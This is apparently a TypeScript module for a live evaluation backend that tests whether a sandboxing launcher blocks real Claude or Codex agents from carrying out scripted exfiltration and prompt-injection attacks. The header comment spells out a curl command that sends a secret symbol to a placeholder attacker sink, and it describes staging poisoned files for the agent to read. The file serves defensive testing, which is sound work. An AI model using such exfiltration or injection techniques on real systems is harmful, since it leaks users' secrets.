/**
 * run-live — the LIVE eval backend: run the REAL claude/codex binary under the
 * FULL launcher (all chokepoints on) against the attack + benign corpus and score
 * the real attack-blocked rate / benign-completion / overhead.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHAT THIS IS (and how it differs from the deterministic backend)
 *
 *   run-deterministic.ts boots the arbiter + ingress proxy IN-PROCESS and posts a
 *   hand-built Messages/Responses request through them — no real agent binary,
 *   no OS chokepoints. This backend instead spawns the ACTUAL `claude` /
 *   `codex` CLI THROUGH `launcher/mandu-run.sh` (a thin shim to the single TS
 *   launcher) with the live chokepoints (`--net-proxy --exec-wrap`), so the tool calls
 *   are gated by the real OS-level enforcement, not an in-process mock. It is the
 *   "does the COMPOSED stack block a REAL binary's attempt?" oracle.
 *
 *   OPT-IN: this backend SKIPS cleanly (a SKIPPED report) when the target binary
 *   is not on PATH, so it never breaks a portable suite. The CLI exits 0 on skip.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * THE TWO MODES
 *
 *   mode="fake" (DEFAULT — offline, no API key, deterministic):
 *     A scripted FAKE upstream (lifted from tests/lib/, served over
 *     self-signed HTTPS because the stock model/openai proxy forwards upstream over
 *     HTTPS only) stands in for api.anthropic.com / api.openai.com, so a REAL binary
 *     runs with NO API key and NO network. The fake SCRIPTS the agent to ATTEMPT the
 *     attack: it replies with a tool_use that runs the attacker command — an exfil
 *     `curl --data "<intent-literal> <symbol>" http://<attacker-sink>` carrying a
 *     arbiter-registered UNTRUSTED $MDU:* symbol in the request body. Because
 *     the launcher's NETWORK egress chokepoint is LIVE, the egress gate DENIES the
 *     untrusted symbol bound for the untrusted destination → 403 → curl -f exits
 *     non-zero → the secret never reaches the attacker sink (sinkReceived=0). We
 *     build the EvalTranscript from the REAL session output (claude's stream-json
 *     tool_use + tool_result; codex's is synthetic from the known command + the
 *     launcher's real block signals) and scoreAttack → attack_blocked. This proves
 *     the composed stack blocks an ATTEMPTED attack through a real binary, offline.
 *
 *       Why a pre-registered symbol? The egress gate only DENIES a symbol the arbiter
 *       KNOWS as active+untrusted (an unknown token is a no-op — nothing in the table
 *       to leak). So, exactly as launcher/test/net-proxy-live.test.sh does, we
 *       allocate one via the arbiter's `symbolize` op and have the scripted command
 *       carry it (passed to the agent via the MANDU_EVAL_SYM env var, which the
 *       agent's Bash tool expands onto the real wire).
 *
 *       Why curl is NOT exec-shadowed: the exec gate desymbolizes a DATA-position
 *       symbol IN-SLOT for a HumanShell network command (curl --data <sym>), which
 *       would defeat the egress symbol gate. Leaving curl un-shadowed routes the
 *       symbol-carrying exfil to the NETWORK chokepoint, where it is blocked intact.
 *       wget/nc/rm/git stay exec-shadowed.
 *
 *   mode="real-api" (OPT-IN — needs ANTHROPIC_API_KEY / OPENAI_API_KEY):
 *     Point the launcher at the REAL model endpoint, stage the attack as REAL
 *     poisoned content (a file the agent Reads / a prompt), and let the REAL model
 *     decide. scoreAttack then yields the TRUE ASR (the defense should drive it to
 *     0). This is the true ASR/utility/overhead measurement; it is gated behind
 *     the flag + key presence (we SKIP it if no key).
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * DEFENSE ON vs OFF
 *   defense="full"  → the launcher with all chokepoint flags (the gate is live).
 *   defense="none"  → the launcher WITHOUT chokepoint flags (a bare run; the
 *                     proxy still symbolizes, but no egress/exec gate). The exfil
 *                     then REACHES the mock attacker sink → attack_success, the
 *                     faithful FULL(blocked)-vs-NONE(succeeds) contrast + the
 *                     overhead baseline (compareOverhead token/latency deltas).
 *
 * The attack targets a per-case MOCK SINK on 127.0.0.2 (a resolvable untrusted
 * destination NOT in the launcher's NO_PROXY, so the agent's curl is routed THROUGH
 * the egress proxy). The sink records what it received: 0 under FULL (gate blocked),
 * ≥1 under NONE (the symbol leaked) — directly observable in the case detail.
 * ─────────────────────────────────────────────────────────────────────────────
 */

import { spawnSync } from "node:child_process";
import { existsSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { buildCases, type EvalCase } from "./corpus.js";
import { aggregate, type CaseOutcome, type EvalReport } from "./metrics.js";

// Repo paths, the Target/LiveMode/Defense mode types, the arbiter `symbolize`
// IPC helper, and the shared arbiter+proxy stack live in ./live-stack
// (agent-legibility split); the mode types are re-exported so the public API
// is unchanged, the rest is imported back for the run orchestration below.
export type { Target, LiveMode, Defense } from "./live-stack.js";

// The launcher spawn path (defense flags, clean agent env, argv construction,
// output capture → RunResult) lives in ./launcher-run (agent-legibility split);
// RunResult is re-exported so the public API is unchanged.
export type { RunResult } from "./launcher-run.js";
import { apiKeyFor } from "./launcher-run.js";

// Per-case orchestration (fake-mode scripting, the mock sink, attack/benign
// case runners) lives in ./case-runners (agent-legibility split).
import { runAttackCase, runBenignCase } from "./case-runners.js";
import {
  LAUNCHER,
  ARBITER_TSX,
  MODEL_PROXY_TSX,
  OPENAI_PROXY_TSX,
  EGRESS_DIR,
  type Target,
  type LiveMode,
  type Defense,
} from "./live-stack.js";

// ─────────────────────────────────────────────────────────────────────────────
// Binary / dependency availability (the OPT-IN guard).
// ─────────────────────────────────────────────────────────────────────────────

/** Is the target binary on PATH (so a live run is possible)? */
export function binaryAvailable(target: Target): boolean {
  try {
    const r = spawnSync(target, ["--version"], { encoding: "utf8", timeout: 15_000 });
    return r.status === 0;
  } catch {
    return false;
  }
}

/** A coarse "are the launcher + arbiter + the right proxy installed?" probe. */
function depsAvailable(target: Target, mode: LiveMode): { ok: boolean; reason?: string } {
  if (!existsSync(LAUNCHER)) return { ok: false, reason: `launcher missing (${LAUNCHER})` };
  if (!existsSync(ARBITER_TSX)) return { ok: false, reason: `arbiter tsx missing — 'cd arbiter && npm install'` };
  const proxyTsx = target === "claude" ? MODEL_PROXY_TSX : OPENAI_PROXY_TSX;
  if (!existsSync(proxyTsx)) {
    return { ok: false, reason: `${target === "claude" ? "anthropic-proxy" : "openai-proxy"} tsx missing — run npm install in it` };
  }
  if (!existsSync(join(EGRESS_DIR, "node_modules"))) {
    return { ok: false, reason: `net-proxy deps missing — 'cd interceptors/net-proxy && npm install'` };
  }
  // Fake mode serves the upstream over self-signed HTTPS, minted via openssl.
  if (mode === "fake" && !opensslAvailable()) {
    return { ok: false, reason: `openssl not on PATH (needed to mint the fake upstream's TLS cert)` };
  }
  return { ok: true };
}

// TLS cert minting for the fake upstreams lives in ./tls (the proxies forward to
// the upstream over HTTPS only, so each fake mints a throwaway self-signed cert
// via the openssl CLI; openssl absent → the run SKIPS). opensslAvailable is
// imported back for depsAvailable; not part of the public API.
import { opensslAvailable } from "./tls.js";

// Scripted fake Anthropic/OpenAI upstreams live in ./fake-upstreams;
// CapturedRequest is re-exported (public API). The per-case runners in
// ./case-runners consume FakeUpstream + startFake* directly.
export { type CapturedRequest } from "./fake-upstreams.js";

// ─────────────────────────────────────────────────────────────────────────────
// Transcript normalization — REAL session output → EvalTranscript.
//
// Claude emits NDJSON (--output-format stream-json --verbose): `assistant`
// messages carry tool_use content blocks; `user` messages carry tool_result
// content blocks; a final `result` carries usage. We pair each tool_use with its
// tool_result by tool_use_id, render a flat `text` the oracle's security_check
// patterns match, and carry the result text (so the chokepoint block signal —
// the 403 / exit-77 the gate returns — is visible to toolUseBlockedOrFailed).
// ─────────────────────────────────────────────────────────────────────────────

// Stream normalizers (claude stream-json / codex prose → EvalTranscript) live
// in ./normalize-stream; re-exported here so the public API is unchanged, and
// imported back for the live scoring path below (runThroughLauncher).
export { normalizeClaudeStream, normalizeCodexStream } from "./normalize-stream.js";

// ─────────────────────────────────────────────────────────────────────────────
// runLive — the public entry.
// ─────────────────────────────────────────────────────────────────────────────

export interface RunLiveOptions {
  target: Target;
  mode: LiveMode;
  defense: Defense;
  /** Corpus filter substrings (comma-joined ids), e.g. "AT-02,BT-04". */
  filter?: string;
  /** Cap how many attacks / benign cases run live (default: 2 each). */
  maxAttacks?: number;
  maxBenign?: number;
  /** Per-case timeout (ms). */
  timeoutMs?: number;
}

export interface LiveReport extends EvalReport {
  /** When the binary/deps are absent we return a clearly-marked SKIPPED report. */
  skipped?: { reason: string };
  /** The mode + target the run used (for the printout header). */
  liveMode: LiveMode;
  liveTarget: Target;
  liveDefense: Defense;
}

/**
 * Run the LIVE eval for one (target, mode, defense) and return an aggregated
 * report. Guards on binary + dependency availability: returns a SKIPPED report
 * (no cases) when the binary is absent, so the CLI/tests can exit 0 cleanly.
 */
export async function runLive(options: RunLiveOptions): Promise<LiveReport> {
  const { target, mode, defense } = options;
  const timeoutMs = options.timeoutMs ?? 120_000;
  const maxAttacks = options.maxAttacks ?? 2;
  const maxBenign = options.maxBenign ?? 2;

  const skipReport = (reason: string): LiveReport => ({
    // "task_utility": live benign rows are a REAL model performing the task —
    // the genuine utility measure (vs. the deterministic backend's "fidelity").
    ...aggregate(defenseLabel(mode, defense), [], "task_utility"),
    skipped: { reason },
    liveMode: mode,
    liveTarget: target,
    liveDefense: defense,
  });

  if (!binaryAvailable(target)) {
    return skipReport(`${target} binary not found on PATH`);
  }
  const deps = depsAvailable(target, mode);
  if (!deps.ok) {
    return skipReport(deps.reason ?? "required dependencies missing");
  }
  if (mode === "real-api" && !apiKeyFor(target)) {
    return skipReport(
      `real-api mode needs ${target === "claude" ? "ANTHROPIC_API_KEY" : "OPENAI_API_KEY"} (not set)`,
    );
  }

  // Pick a representative subset across categories.
  const all = buildCases({ filter: options.filter });
  const attacks = all.filter((c): c is Extract<EvalCase, { kind: "attack" }> => c.kind === "attack");
  const benign = all.filter((c): c is Extract<EvalCase, { kind: "benign" }> => c.kind === "benign");
  const pickedAttacks = pickAcrossCategories(attacks, maxAttacks);
  const pickedBenign = benign.slice(0, maxBenign);

  const outcomes: CaseOutcome[] = [];
  const tmpRoot = mkdtempSync(join(tmpdir(), "mandu-eval-live-"));

  try {
    for (const c of pickedAttacks) {
      outcomes.push(await runAttackCase(c.attack, { target, mode, defense, timeoutMs, tmpRoot }));
    }
    for (const c of pickedBenign) {
      outcomes.push(await runBenignCase(c.benign, { target, mode, defense, timeoutMs, tmpRoot }));
    }
  } finally {
    rmSync(tmpRoot, { recursive: true, force: true });
  }

  return {
    ...aggregate(defenseLabel(mode, defense), outcomes, "task_utility"),
    liveMode: mode,
    liveTarget: target,
    liveDefense: defense,
  };
}

function defenseLabel(mode: LiveMode, defense: Defense): string {
  return `live-${mode}-${defense}`;
}

/** Round-robin pick across the three attack categories so the subset is representative. */
function pickAcrossCategories(
  attacks: Array<Extract<EvalCase, { kind: "attack" }>>,
  n: number,
): Array<Extract<EvalCase, { kind: "attack" }>> {
  const byCat = new Map<string, Array<Extract<EvalCase, { kind: "attack" }>>>();
  for (const a of attacks) {
    const k = a.attack.category;
    if (!byCat.has(k)) byCat.set(k, []);
    byCat.get(k)!.push(a);
  }
  const out: Array<Extract<EvalCase, { kind: "attack" }>> = [];
  const queues = [...byCat.values()];
  let i = 0;
  while (out.length < n && queues.some((q) => q.length > 0)) {
    const q = queues[i % queues.length];
    if (q.length > 0) out.push(q.shift()!);
    i++;
  }
  return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// Overhead helper (defense=full vs none) — re-exports the metrics comparator so
// the CLI can fold an overhead block into the FULL report.
// ─────────────────────────────────────────────────────────────────────────────

export { compareOverhead, printReport } from "./metrics.js";
